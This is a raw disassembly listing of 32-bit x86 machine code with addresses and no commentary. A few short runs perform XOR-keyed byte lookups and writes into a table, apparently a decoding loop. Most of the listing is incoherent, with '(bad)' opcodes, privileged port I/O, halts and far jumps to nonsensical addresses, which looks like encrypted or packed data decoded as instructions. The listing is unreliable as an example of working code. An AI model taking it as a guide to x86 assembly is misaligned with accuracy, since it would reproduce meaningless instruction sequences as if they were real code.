  408b64:	add    edx,ecx
  408b66:	jmp    0x409637
  408b6b:	mov    edx,DWORD PTR [ebp-0x18]
  408b6e:	xor    edx,eax
  408b70:	add    edx,DWORD PTR [ebp-0x14]
  408b73:	mov    edi,DWORD PTR [ebp-0x1c]
  408b76:	mov    dl,BYTE PTR [edx+edi*1+0x32729c]
  408b7d:	mov    BYTE PTR [ebp+0xf],dl
  408b80:	jmp    0x408d94
  408b85:	arpl   WORD PTR [ecx+edx*8+0x7359f11a],dx
  408b8c:	push   ecx
  408b8d:	out    0xb0,eax
  408b8f:	jnp    0x408bf2
  408b91:	sub    ebx,DWORD PTR [ecx+0x77]
  408b94:	mov    edi,0x7070d09a
  408b99:	imul   edi,DWORD PTR [edi+0x70],0xf301d770
  408ba0:	jb     0x408bad
  408ba2:	in     eax,0x34
  408ba4:	dec    ebp
  408ba5:	jle    0x408bcc
  408ba7:	and    bh,BYTE PTR [edx-0x770a433c]
  408bad:	repz sti 
  408baf:	jp     0x408bb1
  408bb1:	sub    BYTE PTR [esi*4-0x1eb882df],dh
  408bb8:	loopne 0x408bef
  408bba:	test   eax,0x5c37164d
  408bbf:	mov    ds:0x5256ffd5,eax
  408bc4:	test   DWORD PTR [eax],0x9de879a7
  408bca:	jbe    0x408ba8
  408bcc:	ss pop eax
  408bce:	shr    BYTE PTR [eax+0x16],cl
  408bd1:	jp     0x408b5a
  408bd3:	pop    ds
  408bd4:	bound  ecx,QWORD PTR [edi]
  408bd6:	(bad)  
  408bd7:	shr    BYTE PTR [ebx+0x4a],0x47
  408bdb:	or     ch,BYTE PTR [esi]
  408bdd:	sub    DWORD PTR [eax],0x34206aa1
  408be3:	mov    ah,0xbf
  408be5:	mov    BYTE PTR [esi+0x31f935a7],dl
  408beb:	scas   eax,DWORD PTR es:[edi]
  408bec:	enter  0xeefc,0xbe
  408bf0:	(bad)  
  408bf1:	mov    edx,0xc78a35d4
  408bf6:	push   esi
  408bf7:	inc    ebx
  408bf8:	or     DWORD PTR [edi],eax
  408bfa:	xchg   edx,eax
  408bfb:	mov    DWORD PTR [esi+0x48f95076],esi
  408c01:	inc    ebp
  408c02:	jmp    0x408be8
  408c04:	pop    edx
  408c05:	push   ebx
  408c06:	sbb    BYTE PTR [edi*4+0x41776bc8],bh
  408c0d:	mov    fs:0xc4bcf99b,al
  408c13:	sub    eax,DWORD PTR [ebx+0x28]
  408c16:	data16 jmp 0x408c83
  408c19:	stc    
  408c1a:	jbe    0x408c8e
  408c1c:	imul   edx,DWORD PTR es:[esi-0x79ef2fd7],0x9a0f1d7c
  408c27:	loopne 0x408bcc
  408c29:	js     0x408be6
  408c2b:	scas   eax,DWORD PTR es:[edi]
  408c2c:	cmp    BYTE PTR [ebp+0x17],dl
  408c2f:	in     al,dx
  408c30:	fs xor cl,cl
  408c33:	push   edx
  408c34:	mov    dl,0xa4
  408c36:	xchg   ebx,eax
  408c37:	std    
  408c38:	sub    BYTE PTR [ebx-0x4d],ah
  408c3b:	ins    DWORD PTR es:[edi],dx
  408c3c:	test   DWORD PTR ds:0x83e597ea,edx
  408c42:	leave  
  408c43:	adc    al,0x2b
  408c45:	ins    BYTE PTR es:[edi],dx
  408c46:	mov    eax,0xeb64fc78
  408c4b:	js     0x408bda
  408c4d:	jp     0x408c1d
  408c4f:	push   es
  408c50:	xor    BYTE PTR [ebp-0x1521d146],cl
  408c56:	enter  0x193,0xed
  408c5a:	imul   edx,esp,0xffffffa0
  408c5d:	sbb    edi,esi
  408c5f:	ja     0x408c32
  408c61:	repnz loope 0x408be6
  408c64:	jl     0x408be6
  408c66:	ds inc edx
  408c68:	xchg   ecx,eax
  408c69:	mov    edx,0xf9832f29
  408c6e:	ins    BYTE PTR es:[edi],dx
  408c6f:	sub    ebx,esp
  408c71:	mov    edx,edi
  408c73:	das    
  408c74:	mov    eax,ds:0xd7855484
  408c79:	data16 mov bl,0x41
  408c7c:	mov    ebx,0x1783b704
  408c81:	adc    eax,0x33259e2d
  408c86:	add    dh,BYTE PTR [esi+0x2f702620]
  408c8c:	inc    edi
  408c8d:	sub    BYTE PTR [ebp+eax*2+0x13848fe8],bl
  408c94:	stos   DWORD PTR es:[edi],eax
  408c95:	(bad)  
  408c97:	and    al,0x8c
  408c99:	push   0xffffffdb
  408c9b:	or     DWORD PTR [esi-0x3d],0xfffffff8
  408c9f:	mov    BYTE PTR fs:[edi],dl
  408ca2:	sub    al,0x4a
  408ca4:	jle    0x408d23
  408ca6:	scas   eax,DWORD PTR es:[edi]
  408ca7:	xchg   ecx,eax
  408ca8:	inc    edx
  408ca9:	cmp    edi,edx
  408cab:	imul   esi,DWORD PTR [esp+eax*4],0x38
  408caf:	sahf   
  408cb0:	pop    ecx
  408cb1:	mov    ds,WORD PTR [esi]
  408cb3:	sbb    ebp,edx
  408cb5:	aas    
  408cb6:	mov    ebx,0x3bc22acd
  408cbb:	fisub  WORD PTR [esi+0x35143c61]
  408cc1:	clc    
  408cc2:	ret    
  408cc3:	shl    DWORD PTR [edx-0x3e492296],1
  408cc9:	pop    ecx
  408cca:	mov    DWORD PTR [ecx],eax
  408ccc:	mov    eax,0x393af165
  408cd2:	ss retf 0x606
  408cd6:	sub    eax,0x318f8f66
  408cdb:	jle    0x408d58
  408cdd:	and    BYTE PTR [ebx+0x6378b588],cl
  408ce3:	(bad)  
  408ce4:	push   esi
  408ce5:	mov    ebp,0xd6a4674d
  408cea:	sub    edi,DWORD PTR [ebp+edi*1+0x6e]
  408cee:	fdivr  DWORD PTR [esp+edi*4-0x7b]
  408cf2:	test   BYTE PTR [ebx-0x182f2a06],dl
  408cf8:	xchg   DWORD PTR [ebp+edx*1+0x6b],eax
  408cfc:	lea    esp,[ecx]
  408cfe:	ins    DWORD PTR es:[edi],dx
  408cff:	lea    eax,[edx-0x2e]
  408d02:	fnstcw WORD PTR [ebx+0x4c80b93f]
  408d08:	repnz (bad) [esi+0x39]
  408d0c:	popf   
  408d0d:	pop    ds
  408d0e:	inc    edi
  408d0f:	in     al,0x9c
  408d11:	in     al,0xc2
  408d13:	mov    al,ds:0xa7df564f
  408d18:	add    eax,0x8db7012
  408d1d:	dec    esp
  408d1e:	inc    esp
  408d1f:	push   es
  408d20:	jle    0x408d3e
  408d22:	xor    ch,BYTE PTR [bx]
  408d25:	mov    ch,0xf2
  408d27:	and    DWORD PTR [esi-0x5162e856],edx
  408d2d:	fsubrp st(4),st
  408d2f:	les    ebx,FWORD PTR [ebx+0x52b39d64]
  408d35:	xchg   esi,eax
  408d36:	sub    eax,0x9771ff7f
  408d3b:	adc    BYTE PTR [esi+0x5b923bd8],ch
  408d41:	or     DWORD PTR [ebx],edi
  408d43:	or     BYTE PTR [ecx-0x26a4cb0e],bl
  408d49:	and    ch,bl
  408d4b:	mov    ebx,0x12564cd4
  408d50:	adc    dl,BYTE PTR [ebp-0x17]
  408d53:	lahf   
  408d54:	and    BYTE PTR [eax+0x7130486],bh
  408d5a:	sub    edi,0x28
  408d5d:	cs jmp 0xcc0:0x7b3166e8
  408d65:	cli    
  408d66:	adc    bl,dh
  408d68:	cmp    al,0xbb
  408d6a:	add    ecx,esi
  408d6c:	add    DWORD PTR [edi-0x42],esi
  408d6f:	stc    
  408d70:	pop    ebx
  408d71:	mov    al,BYTE PTR [edi-0x67]
  408d74:	sar    ebx,0x42
  408d77:	jmp    0x408dca
  408d79:	xor    ebp,DWORD PTR [edx]
  408d7b:	inc    esi
  408d7c:	adc    eax,0x444498c3
  408d81:	xor    eax,0x9f9ecc43
  408d86:	xor    ebx,ebp
  408d88:	mov    bl,0x2
  408d8a:	mov    edx,0xb0ef3e03
  408d8f:	push   ds
  408d90:	cmp    ah,0xa8
  408d93:	sub    al,0x8b
  408d95:	push   ebp
  408d96:	hlt    
  408d97:	xor    edx,eax
  408d99:	add    edx,DWORD PTR [ebp-0x14]
  408d9c:	mov    edi,DWORD PTR [ebp-0x1c]
  408d9f:	mov    dl,BYTE PTR [edx+edi*1+0x32729c]
  408da6:	mov    BYTE PTR [ebp+0xb],dl
  408da9:	jmp    0x408fbd
  408dae:	bound  ebp,QWORD PTR [ebx-0xa]
  408db1:	popf   
  408db2:	cmc    
  408db3:	mov    eax,ds:0xc8827371
  408db8:	cdq    
  408db9:	ins    BYTE PTR es:[edi],dx
  408dba:	and    DWORD PTR [ecx],edx
  408dbc:	dec    ebp
  408dbd:	fcom   DWORD PTR [ebx+0x697070de]
  408dc3:	jg     0x408e35
  408dc5:	jo     0x408df1
  408dc7:	sbb    BYTE PTR [ecx+0x4],ah
  408dca:	stos   BYTE PTR es:[edi],al
  408dcb:	jns    0x408dd7
  408dcd:	xor    eax,0xe69f1814
  408dd2:	mov    eax,0xec810c9a
  408dd7:	push   0xffffffc8
  408dd9:	mov    ebx,0x67ab9e9d
  408dde:	and    eax,DWORD PTR [ecx]
  408de0:	mov    fs:0xbdd99fb2,al
  408de6:	leave  
  408de7:	and    al,0xe8
  408de9:	enter  0x84e3,0x86
  408ded:	retf   0x4b79
  408df0:	lds    edx,FWORD PTR [ecx]
  408df2:	xor    dh,BYTE PTR fs:[esi-0x7f]
  408df6:	jg     0x408e77
  408df8:	jne    0x408dd2
  408dfa:	mov    ebp,0xa50ff890
  408dff:	pop    es
  408e00:	imul   edi,DWORD PTR [edx-0x6d],0xa604a529
  408e07:	jb     0x408db5
  408e09:	(bad)  [edx]
  408e0b:	inc    esp
  408e0c:	mul    DWORD PTR [ebx-0x17]
  408e0f:	arpl   WORD PTR [esi+0x32],si
  408e12:	xchg   edx,eax
  408e13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408e14:	adc    bl,BYTE PTR [edi+0x20]
  408e17:	push   ecx
  408e18:	rol    al,0xfb
  408e1b:	adc    BYTE PTR [ebx-0x73],ch
  408e1e:	in     eax,dx
  408e1f:	jns    0x408df4
  408e21:	and    DWORD PTR [eax+ebx*4+0x5c],ecx
  408e25:	jbe    0x408dad
  408e27:	jmp    ebp
  408e29:	scas   al,BYTE PTR es:[edi]
  408e2a:	cs xchg ecx,eax
  408e2c:	jo     0x408e6a
  408e2e:	xchg   ebp,eax
  408e2f:	pop    edx
  408e30:	mov    al,ds:0x6f40411b
  408e35:	push   ds
  408e36:	rcr    BYTE PTR [eax-0x4a],0xe1
  408e3a:	jns    0x408e13
  408e3c:	cdq    
  408e3d:	push   eax
  408e3e:	cmp    al,0xe9
  408e40:	push   ebx
  408e41:	mov    dl,0x42
  408e43:	fidivr DWORD PTR [edi+0x14]
  408e46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408e47:	sub    BYTE PTR [edi+0x4df1c310],dh
  408e4d:	mov    edx,0xb1525ec1
  408e52:	(bad)  
  408e53:	subps  xmm7,xmm4
  408e56:	bound  esi,QWORD PTR [ecx-0x65]
  408e59:	pop    ss
  408e5a:	or     ecx,DWORD PTR [eax]
  408e5c:	xor    ch,BYTE PTR [ebx]
  408e5e:	fst    QWORD PTR [edx-0x4b]
  408e61:	shr    bl,0x9c
  408e64:	pop    es
  408e65:	lods   al,BYTE PTR ds:[esi]
  408e66:	mov    al,ds:0xa0c4f231
  408e6b:	loopne 0x408e4f
  408e6d:	pop    ecx
  408e6e:	push   ebp
  408e6f:	je     0x408e1b
  408e71:	mov    ebx,0x72f5a64f
  408e76:	jl     0x408e5c
  408e78:	call   0x20955dc0
  408e7d:	and    BYTE PTR cs:[ecx+0x4f49ee43],dh
  408e84:	neg    DWORD PTR [ebx-0x63df3c3d]
  408e8a:	adc    al,BYTE PTR [esi]
  408e8c:	inc    edi
  408e8d:	inc    ebx
  408e8e:	jns    0x408e85
  408e90:	adc    DWORD PTR cs:[ecx-0x7],0x42
  408e95:	mov    esp,0xce8eb69d
  408e9a:	mov    ebp,0x65009900
  408e9f:	cli    
  408ea0:	adc    esp,DWORD PTR [eax]
  408ea2:	pop    edi
  408ea3:	lock ficom WORD PTR [ebp-0x51]
  408ea7:	adc    al,BYTE PTR [ebx+0x37]
  408eaa:	mov    edi,0xdb63c817
  408eaf:	jno    0x408e6e
  408eb1:	inc    edx
  408eb2:	mov    DWORD PTR [eax],eax
  408eb4:	jmp    0x247fbb44
  408eb9:	out    dx,al
  408eba:	mov    ds:0xcea5edb6,eax
  408ebf:	aas    
  408ec0:	fcom   QWORD PTR [ecx-0x6c]
  408ec3:	out    dx,eax
  408ec4:	xor    cl,BYTE PTR [esi+0x68a56382]
  408eca:	retf   
  408ecb:	pop    edx
  408ecc:	push   es
  408ecd:	mov    ds:0xbdf44e69,al
  408ed2:	iret   
  408ed3:	xchg   esi,eax
  408ed4:	leave  
  408ed5:	xlat   BYTE PTR ds:[ebx]
  408ed6:	daa    
  408ed7:	cwde   
  408ed8:	pop    es
  408ed9:	jb     0x408ea9
  408edb:	or     dl,BYTE PTR [ecx+0x6cdfa331]
  408ee1:	add    al,0xd1
  408ee3:	mov    eax,ds:0x7731ef92
  408ee8:	push   edi
  408ee9:	push   eax
  408eea:	dec    esp
  408eeb:	adc    DWORD PTR [esi+0x3f],eax
  408eee:	xor    al,0x97
  408ef0:	jb     0x408e72
  408ef2:	xlat   BYTE PTR ds:[ebx]
  408ef3:	ficomp DWORD PTR [edx]
  408ef5:	test   eax,0x9eaa6453
  408efa:	mov    eax,ds:0xcafab9fb
  408eff:	jnp    0x408ec7
  408f01:	in     al,0xb8
  408f03:	pop    es
  408f04:	add    al,0xfa
  408f06:	int3   
  408f07:	push   0x28614411
  408f0c:	sub    esp,edi
  408f0e:	mov    cs,WORD PTR [ebx+ecx*1]
  408f11:	jge    0x408eb9
  408f13:	(bad)  [edx-0x59ec7033]
  408f19:	aad    0x5d
  408f1b:	sar    bl,cl
  408f1d:	lock daa 
  408f1f:	inc    ecx
  408f20:	ins    DWORD PTR es:[edi],dx
  408f21:	jb     0x408f7c
  408f23:	cld    
  408f24:	jmp    0x408f40
  408f26:	xchg   esp,eax
  408f27:	xchg   edi,eax
  408f28:	mov    ds:0x324d59f3,al
  408f2d:	and    BYTE PTR [edi-0x6a],ah
  408f30:	cmc    
  408f31:	(bad)  
  408f32:	enter  0x73b1,0xc0
  408f36:	out    0x8d,al
  408f38:	xchg   edx,eax
  408f39:	aas    
  408f3a:	inc    ebx
  408f3b:	inc    ebx
  408f3c:	mov    ecx,0xca06414e
  408f41:	push   edx
  408f42:	stos   BYTE PTR es:[edi],al
  408f43:	ins    BYTE PTR es:[edi],dx
  408f44:	test   ch,ch
  408f46:	test   DWORD PTR [edi+ebx*8],ebx
  408f49:	dec    edx
  408f4a:	mov    ebx,eax
  408f4c:	mov    cl,0xa0
  408f4e:	ds out dx,eax
  408f50:	shl    BYTE PTR [ecx+0x19],1
  408f53:	xchg   edx,eax
  408f54:	jbe    0x408f42
  408f56:	scas   eax,DWORD PTR es:[edi]
  408f57:	jge    0x408f73
  408f59:	fdivr  DWORD PTR [eiz*2-0x4c8619ef]
  408f60:	int3   
  408f61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408f62:	add    DWORD PTR [esi],edi
  408f64:	dec    eax
  408f65:	cld    
  408f66:	add    BYTE PTR [edi+eax*2+0x4d],bl
  408f6a:	cmp    BYTE PTR [ebp+0x68],bl
  408f6d:	mov    al,ds:0x6e542df8
  408f72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408f73:	lods   al,BYTE PTR ds:[esi]
  408f74:	inc    edx
  408f75:	sub    eax,0xe8732f99
  408f7a:	fnstenv [esi-0x53]
  408f7d:	xchg   ebx,eax
  408f7e:	in     al,0xcb
  408f80:	mov    ah,0x98
  408f82:	clc    
  408f83:	sub    ecx,DWORD PTR [eax+0x77]
  408f86:	push   edi
  408f87:	sar    cl,cl
  408f89:	mov    eax,0x46f5e33e
  408f8e:	out    dx,eax
  408f8f:	mov    esp,DWORD PTR [ebp-0x77eb09c1]
  408f95:	shr    BYTE PTR [ebx+0x2bec30c6],cl
  408f9b:	lods   eax,DWORD PTR ds:[esi]
  408f9c:	ror    BYTE PTR ds:0x561d5936,1
  408fa2:	imul   eax,DWORD PTR [edi+0x29fa32e0],0x4d
  408fa9:	push   0xffffff8a
  408fab:	nop
  408fac:	test   ah,ah
  408fae:	loope  0x409020
  408fb0:	sbb    al,0xe7
  408fb2:	outs   dx,DWORD PTR ds:[esi]
  408fb3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408fb4:	xor    BYTE PTR [edi+0x10],bl
  408fb7:	and    BYTE PTR [esi+0x6957fcce],0x8a
  408fbe:	push   ebp
  408fbf:	jnp    0xf8748442
  408fc5:	add    edi,DWORD PTR [ebp-0x14]
  408fc8:	mov    ebx,DWORD PTR [ebp-0x1c]
  408fcb:	mov    BYTE PTR [edi+ebx*1+0x32729c],dl
  408fd2:	mov    dl,BYTE PTR [ebp+0xb]
  408fd5:	mov    edi,DWORD PTR [ebp-0x18]
  408fd8:	xor    edi,eax
  408fda:	add    edi,DWORD PTR [ebp-0x14]
  408fdd:	mov    ebx,DWORD PTR [ebp-0x1c]
  408fe0:	mov    BYTE PTR [edi+ebx*1+0x32729c],dl
  408fe7:	mov    edx,DWORD PTR [ebp-0x44]
  408fea:	mov    edi,DWORD PTR [ebp-0xc]
  408fed:	xor    edx,eax
  408fef:	xor    edi,eax
  408ff1:	add    edx,ecx
  408ff3:	jmp    0x409207
  408ff8:	or     ah,bh
  408ffa:	das    
  408ffb:	mov    ?,ecx
  408ffd:	push   esi
  408ffe:	test   eax,0xbb5c4a63
  409003:	into   
  409004:	and    eax,0x0
  409007:	mov    ah,0x8c
  409009:	fdiv   QWORD PTR [eax+0x70]
  40900c:	imul   edi,DWORD PTR [edi+0x70],0xf0495270
  409013:	sbb    eax,0x7d389a41
  409018:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409019:	pop    ebx
  40901a:	pop    edx
  40901b:	repnz cmp eax,0x73948ef5
  409021:	or     al,0x40
  409023:	cmp    DWORD PTR [ebx-0x16],esp
  409026:	test   al,0x32
  409028:	imul   esi,DWORD PTR [eax+0x5398555c],0x62
  40902f:	or     eax,0x3ca8a785
  409034:	sub    eax,0x7b7c8658
  409039:	inc    ecx
  40903a:	or     eax,0x14782178
  40903f:	inc    edx
  409040:	adc    dh,dh
  409042:	mov    BYTE PTR [esp+esi*4+0x126fee25],cl
  409049:	or     al,0x34
  40904b:	sub    BYTE PTR [edx],bh
  40904d:	mov    ebx,0x9372375a
  409052:	mov    dh,0x28
  409054:	mov    ebp,0xcfb9f6af
  409059:	push   es
  40905a:	in     al,0x21
  40905c:	(bad)  
  40905d:	xor    dh,BYTE PTR [esi+0x1e8e8e08]
  409063:	add    BYTE PTR [eax-0x222896f4],al
  409069:	cld    
  40906a:	push   esp
  40906b:	xchg   DWORD PTR [esi-0x10a0e92f],edx
  409071:	xchg   ebp,eax
  409072:	push   es
  409073:	push   es
  409074:	pop    ds
  409075:	jl     0x409025
  409077:	(bad)  
  409078:	std    
  409079:	fistp  DWORD PTR [eax-0x72]
  40907c:	inc    eax
  40907d:	jbe    0x4090e8
  40907f:	and    BYTE PTR [ecx-0x68],bh
  409082:	scas   eax,DWORD PTR es:[edi]
  409083:	stos   DWORD PTR es:[edi],eax
  409084:	adc    cl,BYTE PTR [edi-0x30]
  409087:	mov    dh,0xc2
  409089:	(bad)  
  40908a:	xor    BYTE PTR [esi],al
  40908c:	stos   BYTE PTR es:[edi],al
  40908d:	add    al,0x86
  40908f:	mov    esp,0xce1f3f3c
  409094:	xchg   esp,eax
  409095:	or     ecx,DWORD PTR [ecx+0x148c2c3e]
  40909b:	nop
  40909c:	jnp    0x409112
  40909e:	test   BYTE PTR [ebx-0x58],dl
  4090a1:	sbb    esp,ebx
  4090a3:	fwait
  4090a4:	pop    esp
  4090a5:	inc    esi
  4090a6:	loopne 0x409068
  4090a8:	jnp    0x40906b
  4090aa:	jmp    0xa5179317
  4090af:	dec    eax
  4090b0:	mov    BYTE PTR [edx+ebp*2-0x65a0e0c2],cl
  4090b7:	fwait
  4090b8:	mov    edx,DWORD PTR fs:[ebx+0x2]
  4090bc:	push   eax
  4090bd:	inc    ebx
  4090be:	ds loopne 0x4090ab
  4090c1:	mov    es,WORD PTR [edi+0x52]
  4090c4:	cli    
  4090c5:	cmp    eax,0x2a1d0c0
  4090ca:	loopne 0x409072
  4090cc:	mov    ds:0xe8221ed4,al
  4090d1:	mov    ch,0x52
  4090d3:	call   0x9284:0x665937a2
  4090da:	push   edx
  4090db:	cwde   
  4090dc:	outs   dx,DWORD PTR ds:[esi]
  4090dd:	test   eax,0xfd6a6bd9
  4090e2:	imul   ebp,DWORD PTR [ebx+0x1f47e72d],0xfcd90bc7
  4090ec:	in     al,0xec
  4090ee:	popf   
  4090ef:	mov    bl,0xa2
  4090f1:	pusha  
  4090f2:	jne    0x40915e
  4090f4:	push   cs
  4090f5:	add    eax,0xb87f53bb
  4090fa:	sbb    eax,0x3c9ef7fc
  4090ff:	test   eax,0x359a5ca0
  409104:	shl    DWORD PTR [ebp-0x1be964ed],cl
  40910a:	lods   eax,DWORD PTR ds:[esi]
  40910b:	jb     0x40917a
  40910d:	dec    edi
  40910e:	jl     0x409167
  409110:	jb     0x409182
  409112:	sbb    ecx,eax
  409114:	cmp    dl,BYTE PTR [ecx-0x25]
  409117:	leave  
  409118:	mov    edx,0xbfceef
  40911d:	add    ecx,DWORD PTR [ecx-0x53]
  409120:	push   edx
  409121:	adc    al,0x5b
  409123:	add    ah,BYTE PTR [ebp+ecx*1-0x4e]
  409127:	imul   edx,DWORD PTR [eax+0x18d5fdec],0x79
  40912e:	arpl   WORD PTR [ecx-0x2b],dx
  409131:	fcmovnbe st,st(5)
  409133:	hlt    
  409134:	aas    
  409135:	ds (bad) 
  409137:	leave  
  409138:	lahf   
  409139:	lods   eax,DWORD PTR fs:[esi]
  40913b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40913c:	mov    BYTE PTR [edi+0x7c],cl
  40913f:	mov    BYTE PTR [edi+0x27],cl
  409142:	sbb    dh,BYTE PTR [ecx-0x1cc24218]
  409148:	jmp    0xeec8:0xd456f4db
  40914f:	ss cmc 
  409151:	cs jae 0x4090f3
  409154:	mov    ds:0x6ab5ce6d,al
  409159:	cmp    al,0x85
  40915b:	pop    ss
  40915c:	jmp    0xffe2a303
  409161:	or     esp,0xc051174c
  409167:	js     0x40914c
  409169:	sub    al,0xe8
  40916b:	mov    DWORD PTR [eax],esp
  40916d:	mov    ch,0x90
  40916f:	jg     0x40915d
  409171:	adc    BYTE PTR [eax-0x143b2f52],bl
  409177:	popf   
  409178:	punpckhdq mm7,QWORD PTR [esi-0x69]
  40917c:	adc    esi,ecx
  40917e:	aam    0x6e
  409180:	or     BYTE PTR [edx+0x63],ah
  409183:	(bad)  
  409184:	hlt    
  409185:	cmp    ebp,edi
  409187:	mov    ebp,0xe9baca2
  40918c:	pushf  
  40918d:	call   DWORD PTR [eax+0x73]
  409190:	inc    eax
  409191:	mov    ebp,0x140174a7
  409196:	rol    DWORD PTR [ecx-0x7f],1
  409199:	push   ecx
  40919a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40919b:	and    ecx,DWORD PTR es:[esi]
  40919e:	lock mov ebp,0x383af5fb
  4091a4:	jne    0x4091b0
  4091a6:	adc    BYTE PTR [eax],al
  4091a8:	fucom  st(3)
  4091aa:	push   esp
  4091ab:	jmp    0x8afd2a99
  4091b0:	add    BYTE PTR ds:0x13614c80,ch
  4091b6:	dec    eax
  4091b7:	mov    esi,0x5f8bcf72
  4091bc:	or     eax,0xb213d66e
  4091c1:	sahf   
  4091c2:	fs mov edx,0x12c45332
  4091c8:	pop    edi
  4091c9:	gs inc ebp
  4091cb:	inc    esp
  4091cc:	xchg   esi,eax
  4091cd:	popa   
  4091ce:	xor    DWORD PTR [edx-0x7],esp
  4091d1:	inc    ecx
  4091d2:	call   0x7732d503
  4091d7:	xor    DWORD PTR [edx],0x51
  4091da:	mov    esi,edx
  4091dc:	jl     0x4091ae
  4091de:	sbb    al,0x48
  4091e0:	out    dx,al
  4091e1:	cs xchg edx,eax
  4091e3:	and    BYTE PTR [edi-0x1e288e1],cl
  4091e9:	scas   eax,DWORD PTR es:[edi]
  4091ea:	sbb    eax,0xe7ef5910
  4091ef:	scas   eax,DWORD PTR es:[edi]
  4091f0:	add    bh,BYTE PTR [ebx-0x2cfff48f]
  4091f6:	not    cl
  4091f8:	xchg   DWORD PTR [esp+eax*8],esp
  4091fb:	aas    
  4091fc:	push   es
  4091fd:	jp     0x4091d3
  4091ff:	es pop edx
  409201:	repz and dl,BYTE PTR [esi]
  409204:	retf   
  409205:	inc    ecx
  409206:	jbe    0x40920b
  409208:	stc    
  409209:	jmp    0x40941d
  40920e:	sbb    BYTE PTR [edx-0x68cdf8d6],0xb1
  409215:	cdq    
  409216:	js     0x4091b8
  409218:	mov    ah,0x66
  40921a:	jo     0x4091b7
  40921c:	pop    edx
  40921d:	aam    0x85
  40921f:	fidiv  DWORD PTR [eax+0x70]
  409222:	imul   edi,DWORD PTR [edi+0x70],0x5173a570
  409229:	in     eax,dx
  40922a:	int    0xf3
  40922c:	loopne 0x40924d
  40922e:	sbb    BYTE PTR [esi+eiz*8+0x22b536f2],dl
  409235:	dec    ebp
  409236:	jp     0x409289
  409238:	stos   DWORD PTR es:[edi],eax
  409239:	mov    dh,0xb8
  40923b:	xchg   edx,eax
  40923c:	scas   al,BYTE PTR es:[edi]
  40923d:	cld    
  40923e:	push   ss
  40923f:	sub    al,BYTE PTR [edx+0x18489c29]
  409245:	pop    bp
  409247:	ret    0x15ba
  40924a:	fs clc 
  40924c:	and    al,0xd9
  40924e:	sahf   
  40924f:	adc    DWORD PTR [edx-0x2a],eax
  409252:	int3   
  409253:	repz jns 0x409283
  409256:	icebp  
  409257:	dec    esp
  409258:	repnz (bad) 
  40925b:	sbb    al,0xd6
  40925d:	jns    0x4091f2
  40925f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409260:	shl    DWORD PTR [eax-0x5a],0x5b
  409264:	push   0x38
  409266:	xlat   BYTE PTR ds:[ebx]
  409267:	push   0x2b0ffc70
  40926c:	or     DWORD PTR [edi-0x26],eax
  40926f:	aas    
  409270:	inc    ebx
  409271:	jge    0x40925a
  409273:	cmp    DWORD PTR [edi+0x5f38d83c],0xffffff8b
  40927a:	(bad)  
  40927b:	mov    ds:0xc1cec988,al
  409280:	fwait
  409281:	mov    ecx,0x44cbf697
  409286:	call   DWORD PTR [ebx]
  409288:	adc    BYTE PTR [ebp-0x3b],bl
  40928b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40928c:	xchg   ebx,eax
  40928d:	sub    al,0xe5
  40928f:	jg     0x409281
  409291:	aam    0x89
  409293:	jl     0x4092d8
  409295:	mov    eax,DWORD PTR [ebp-0x47]
  409298:	mov    edi,DWORD PTR ds:0x859dffc4
  40929e:	ret    
  40929f:	push   es
  4092a0:	or     edi,eax
  4092a2:	dec    eax
  4092a3:	mov    esp,0xb87ac855
  4092a8:	xor    esi,DWORD PTR [edx+0x2c]
  4092ab:	pop    esp
  4092ac:	xor    BYTE PTR [esp+eax*8+0x3a565a83],0xc7
  4092b4:	sti    
  4092b5:	inc    ecx
  4092b6:	dec    ecx
  4092b7:	pusha  
  4092b8:	sbb    BYTE PTR [ebx-0x1e2d804],bl
  4092be:	jle    0x4092bc
  4092c0:	gs push edi
  4092c2:	add    DWORD PTR [eax-0x60],esp
  4092c5:	cld    
  4092c6:	js     0x4092de
  4092c8:	enter  0xfd89,0xbe
  4092cc:	cmc    
  4092cd:	mov    eax,0x8c84904c
  4092d2:	add    DWORD PTR [edx-0x67],esp
  4092d5:	add    cl,BYTE PTR [ebp+eiz*8-0x19132998]
  4092dc:	mov    ecx,0xbaa91c64
  4092e1:	cmp    cl,0x8a
  4092e4:	dec    edx
  4092e5:	pusha  
  4092e6:	int3   
  4092e7:	fsubp  st(3),st
  4092e9:	packsswb mm2,mm2
  4092ec:	xor    al,0xc8
  4092ee:	push   ebx
  4092ef:	imul   edi,ebp,0xffffff83
  4092f2:	and    eax,0xa84b85fa
  4092f7:	mov    esp,0xa8c4ba18
  4092fc:	or     eax,0xa488d967
  409301:	out    dx,al
  409302:	lds    ecx,FWORD PTR ds:0x1d7444fa
  409308:	dec    edx
  409309:	pop    ecx
  40930a:	pop    eax
  40930b:	sti    
  40930c:	mov    al,0xfa
  40930e:	aam    0x15
  409310:	lock ins DWORD PTR es:[edi],dx
  409312:	pop    ds
  409313:	(bad)  
  409314:	push   DWORD PTR [ebx+0x2a]
  409317:	sahf   
  409318:	imul   ecx,ebp,0xffffff88
  40931b:	adc    al,0xcf
  40931d:	dec    ebx
  40931e:	cwde   
  40931f:	in     al,0x8e
  409321:	ss add esi,ecx
  409324:	retf   
  409325:	retf   0x80f3
  409328:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409329:	retf   0xe52
  40932c:	and    eax,0x70b2870e
  409331:	pop    eax
  409332:	outs   dx,DWORD PTR ds:[esi]
  409333:	inc    ebx
  409334:	loope  0x40934e
  409336:	pop    edi
  409337:	into   
  409338:	ret    
  409339:	inc    edi
  40933a:	(bad)  
  40933b:	mov    DWORD PTR [edi-0x500a8fa0],edx
  409341:	dec    esp
  409342:	(bad)  
  409343:	lods   al,BYTE PTR ds:[esi]
  409344:	fdivrp st(7),st
  409346:	push   ebx
  409347:	es add eax,0xaa5d9c8e
  40934d:	lea    eax,[ecx-0x1848541c]
  409353:	aam    0xcb
  409355:	and    dl,bl
  409357:	aas    
  409358:	inc    ebx
  40935a:	xor    eax,esi
  40935c:	ds aam 0x64
  40935f:	xor    BYTE PTR [esi],dl
